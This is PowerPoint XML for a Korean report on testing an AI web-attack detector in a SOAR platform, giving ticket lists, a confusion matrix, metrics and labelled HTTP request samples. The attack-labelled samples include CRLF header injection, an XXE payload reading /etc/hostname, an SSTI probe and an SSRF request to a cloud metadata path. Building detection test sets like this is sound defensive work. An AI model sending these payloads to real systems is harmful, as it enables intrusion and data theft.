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1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58d1f5c2934714" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/extended-properties" Target="/docProps/app.xml" Id="R41c316dbdae84d1c" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="/ppt/presentation.xml" Id="Ref8511c5988747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60b05244c145a1"/>
  </p:sldMasterIdLst>
  <p:notesMasterIdLst>
    <p:notesMasterId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" r:id="R90e9055baa384daf"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="256" r:id="Re8d71c134ae24c38"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="257" r:id="R321d5c3a38454802"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="258" r:id="Rba1c8a5499fb4100"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="259" r:id="Rcfc399c03a254adb"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="260" r:id="R8c90d74417f1432d"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="261" r:id="R63d8c301312b4323"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="262" r:id="R6ede7e6985a741b9"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="263" r:id="R8bdb680c84104b76"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="264" r:id="R0749ed78278d443c"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="265" r:id="Rf5cd6d10cd1b4033"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="266" r:id="R3b4b42b213c04e9c"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="267" r:id="R83f18feed03e4f0c"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="268" r:id="Rb4496939693a46da"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="269" r:id="R135f7f9cc52f4ebe"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="270" r:id="Rd53cd84efef240e5"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="271" r:id="R82f44ed69cd04aa1"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="272" r:id="R592fcc70a4414189"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="273" r:id="Rb1ef1742e6314369"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="274" r:id="R8197d46e2af6482b"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="275" r:id="R342a64efb0a84887"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="276" r:id="R6fdb7800a71841c3"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="277" r:id="R81854c7c6e834173"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="278" r:id="R97434accf44f423b"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="279" r:id="Rc3f39925da0f41c1"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="280" r:id="R196cf1b0f6c84fc1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4f398624d64d79" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideMaster" Target="/ppt/slideMasters/slideMaster1.xml" Id="Ra760b05244c145a1" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R90e9055baa384daf" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/presProps" Target="/ppt/presProps.xml" Id="R2f3b2a0b862f4507" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tableStyles" Target="/ppt/tableStyles.xml" Id="R6f638a8da34b4f12" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide1.xml" Id="Re8d71c134ae24c38" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide2.xml" Id="R321d5c3a38454802" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide3.xml" Id="Rba1c8a5499fb4100" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide4.xml" Id="Rcfc399c03a254adb" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide5.xml" Id="R8c90d74417f1432d" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide6.xml" Id="R63d8c301312b4323" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide7.xml" Id="R6ede7e6985a741b9" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide8.xml" Id="R8bdb680c84104b76" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide9.xml" Id="R0749ed78278d443c" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide10.xml" Id="Rf5cd6d10cd1b4033" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide11.xml" Id="R3b4b42b213c04e9c" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide12.xml" Id="R83f18feed03e4f0c" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide13.xml" Id="Rb4496939693a46da" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide14.xml" Id="R135f7f9cc52f4ebe" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide15.xml" Id="Rd53cd84efef240e5" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide16.xml" Id="R82f44ed69cd04aa1" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide17.xml" Id="R592fcc70a4414189" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide18.xml" Id="Rb1ef1742e6314369" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide19.xml" Id="R8197d46e2af6482b" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide20.xml" Id="R342a64efb0a84887" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide21.xml" Id="R6fdb7800a71841c3" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide22.xml" Id="R81854c7c6e834173" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide23.xml" Id="R97434accf44f423b" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide24.xml" Id="Rc3f39925da0f41c1" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide25.xml" Id="R196cf1b0f6c84f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f71c21fd0b49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09e92b726943ed" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rb7e2229df5ad45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0507dd34ca44ff" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R1e77956a6bf74a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dc595f406545de" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rf181086810ba4f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de76f38b6c4843" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R73cdb9e3b88c4b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b48fd456ec4e93" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rb1717ac3b3da459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74d292e67a14bc6" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R22a83e5188c346b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04b23968e5843fc" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R93cf374ebbfa456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42b83e8a57b4f05" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rbd7c16664d234ec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2c1fad910c943a0" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R4bf2aec9e58842e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adc0c4a04084a3e" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Ra2e3a2a7c1e8422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f86a925ad6c4d31" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R089289df5621475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cd9b1596d1e4985" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rafdb65f0d5ca4af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d4fe3fd3fdc4015" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R76be58c708c440c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da2df1209e94957" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rf4f390dd460143b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56c2c6eb8ea40aa" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rc22f3f1a3bc1445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1520f0599bb4ebc" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R3aa5e9c5bf1a490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8105c05719a41de" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R6a2a2b2f9cf9492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3e7eb88227d485b" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Ra43b0bb6573547a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f6f4df5ff58475f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R8fba160ea1d34b7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cdaf31e7a014f39" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rfde3c76adbc24d1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869bea9f7b641a2" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R3963bfd5c88a4c6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770730008f94a60" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R46e987fb61bd429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572bd855a2c4637" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R24dec6f2f987494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dd0a06fd3a04e97" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Ra9efd70c6d7d4b2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5829e22566f4fab" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rb2b6beb8650046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사용자가 제공한 기존 테스트 과정과 결과를 정리한 자료. 작성일 2026-09-09. 현재 세션에서 서버 재전송·등록·플레이북 실행은 수행하지 않았다. 표기한 서버와 이름은 사용자 제공 정보다.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산출 근거: TP=10, FP=6, TN=4, FN=0. Accuracy=(TP+TN)/20=70%; TPR=TP/(TP+FN)=100%; Precision=TP/(TP+FP)=62.5%; FPR=FP/(FP+TN)=60%. 공격 라벨은 공격 의도·모사 기준이다.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정상 판정은 보안 정책 적합성 또는 무해성을 인증하는 의미가 아니다. 공격 판정은 공격 의도·모사 패턴 기준이다. 192.0.2.0/24는 RFC 5737의 문서용 TEST-NET-1 주소.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://www.rfc-editor.org/info/rfc5737/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설명을 재구성한 기존 테스트 흐름. 현재 세션에서 서버 연결, 로그 전송, 파서/이벤트 등록은 수행하지 않았다. LogGenerator README.md 264–275행은 프로토콜 선택, Host/Port 설정, 카탈로그·샘플 선택, IP/날짜, EPS, 전송 및 총 로그 수 확인 순서를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제공 정보: LogGenerator 파서, AITEST 일반 이벤트, AI TEST 티켓. 현재 설정값을 직접 조회하지 않았다. eyeCloudXOAR-playbook-guide_v4_ko.pdf p74, p77–80: 정오탐 분석과 payload, 결과 및 수동 피드백. 활성 알고리즘/모델 입력 매핑은 제공 자료에서 확인되지 않았다.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첨부 원본 PNG codex-clipboard-b275dc3b-4de1-4eb9-9aa0-9cb439990e1d.png. 화면 #3 이름은 말줄임 처리되어 있으므로 전체 명칭은 사용자 제공 티켓 상태 “정오탐 피드백 데이터 저장”을 따른다. 매뉴얼의 다른 명칭으로 교체하지 않았다. 현재 화면은 저장 완료 또는 재학습 완료의 증거가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티켓 목록 전문. 각 티켓의 제목 AI TEST, 담당자 미지정, 상태 분석/대응 ( 정오탐 피드백 데이터 저장 ). 날짜는 모두 2026-09-08. 두 목록을 정상군/공격군에 임의 매핑하지 않았다.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000380 14:19:07</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000379 14:18:58</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000378 14:18:58</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000377 14:18:40</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000376 14:18:40</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000375 14:18:40</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000374 14:18:22</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000373 14:18:22</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000372 14:18:22</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000371 14:18:13</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000456 16:55:39</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000455 16:55:39</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000454 16:55:39</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000452 16:55:21</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000451 16:55:21</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000450 16:55:21</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000449 16:55:12</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000448 16:55:12</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000447 16:55:12</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000446 16:54:54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독립 계산: {"counts":{"TP":10,"FP":6,"TN":4,"FN":0},"metrics":{"accuracy":0.7,"recall":1,"precision":0.625,"fpr":0.6,"specificity":0.4,"f1":0.7692307692307693}}</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>Accuracy=(TP+TN)/(TP+TN+FP+FN). Recall=TP/(TP+FN). Precision=TP/(TP+FP). FPR=FP/(FP+TN). Specificity=TN/(TN+FP). F1=2TP/(2TP+FP+FN). 혼동행렬 정의는 eyeCloudXOAR-playbook-guide_v4_ko.pdf p74·77–80과 부합한다.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20개 HTTP 요청과 모델 출력. S01~S20은 제공 순서로 부여한 보고서 식별자이며 티켓 ID와 매핑되지 않았다.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S01 수동=정상 모델=공격 화면값=0.47 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /redirect?next=%2Fhome HTTP/1.1\r\nHost: host-37\r\nConnection: close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S02 수동=정상 모델=정상 화면값=0.39 TN</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>POST /upload HTTP/1.1\r\nHost: host-11\r\nContent-Type: multipart/form-data; boundary=EVALBOUNDARY\r\n\r\n--EVALBOUNDARY\r\nContent-Disposition: form-data; name="홍길동 11"; filename="C:/ProgramData/Your-Company/SecurityData/event-11.dat"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S03 수동=정상 모델=공격 화면값=0.48 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>POST /login HTTP/1.1\r\nHost: host-11\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=user01&amp;password=incorrect-password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S04 수동=정상 모델=정상 화면값=0.30 TN</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /health HTTP/1.1\r\nHost: host-22\r\nUser-Agent: kube-probe/1.30\r\nAccept: */*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S05 수동=정상 모델=공격 화면값=0.31 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>POST /api/search HTTP/1.1\r\nHost: host-11\r\nContent-Type: application/json\r\n\r\n{"operator":"union","fields":["name","department"],"page":1}</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>분류 기준 참고:</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://owasp.org/www-community/attacks/SQL_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://owasp.org/www-community/attacks/Path_Traversal</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://owasp.org/www-community/vulnerabilities/CRLF_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Injection_Testing/18-Testing_for_Server-side_Template_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://logging.apache.org/security.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://kubernetes.io/docs/concepts/workloads/pods/probes/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://www.rfc-editor.org/info/rfc5737/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20개 HTTP 요청과 모델 출력. S01~S20은 제공 순서로 부여한 보고서 식별자이며 티켓 ID와 매핑되지 않았다.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S06 수동=정상 모델=공격 화면값=0.60 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>POST /tools/ping HTTP/1.1\r\nHost: host-12\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nhost=127.0.0.1&amp;count=4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S07 수동=정상 모델=정상 화면값=0.35 TN</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /download?file=quarterly..final.pdf HTTP/1.1\r\nHost: host-41\r\nAccept: application/pdf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S08 수동=정상 모델=공격 화면값=0.43 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /docs/search?q=HTML%20script%20element%20reference HTTP/1.1\r\nHost: host-3\r\nReferer: [https://host-3/docs](https://host-3/docs)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S09 수동=정상 모델=정상 화면값=0.27 TN</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /search?q=how%20to%20select%20a%20health%20plan HTTP/1.1\r\nHost: host-31\r\nAccept: text/html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S10 수동=정상 모델=공격 화면값=0.65 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /products?id=10&amp;sort=price&amp;direction=asc HTTP/1.1\r\nHost: host-7\r\nUser-Agent: Mozilla/5.0</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>분류 기준 참고:</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://owasp.org/www-community/attacks/SQL_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://owasp.org/www-community/attacks/Path_Traversal</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://owasp.org/www-community/vulnerabilities/CRLF_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Injection_Testing/18-Testing_for_Server-side_Template_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://logging.apache.org/security.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://kubernetes.io/docs/concepts/workloads/pods/probes/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>https://www.rfc-editor.org/info/rfc5737/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20개 HTTP 요청과 모델 출력. S01~S20은 제공 순서로 부여한 보고서 식별자이며 티켓 ID와 매핑되지 않았다.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S11 수동=공격 모델=공격 화면값=0.43 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /redirect?next=%2Fhome%0D%0AX-Test-Injected%3A%20true HTTP/1.1\r\nHost: host-37\r\nConnection: close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S12 수동=공격 모델=공격 화면값=0.46 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>POST /api/import HTTP/1.1\r\nHost: host-11\r\nContent-Type: application/xml\r\n\r\n%3C%21DOCTYPE%20r%20%5B%3C%21ENTITY%20x%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fhostname%22%3E%5D%3E%3Cr%3E%26x%3B%3C%2Fr%3E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S13 수동=공격 모델=공격 화면값=0.37 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>GET /welcome?name=%7B%7B7\*7%7D%7D HTTP/1.1\r\nHost: host-11\r\nAccept: text/html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S14 수동=공격 모델=공격 화면값=0.67 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>POST /preview HTTP/1.1\r\nHost: host-22\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nurl=http%3A%2F%2F192.0.2.20%2Flatest%2Fmeta-data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S15 수동=공격 모델=공격 화면값=0.51 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
